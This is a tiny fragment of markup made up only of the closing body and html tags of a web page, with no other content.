  </body>
</html>
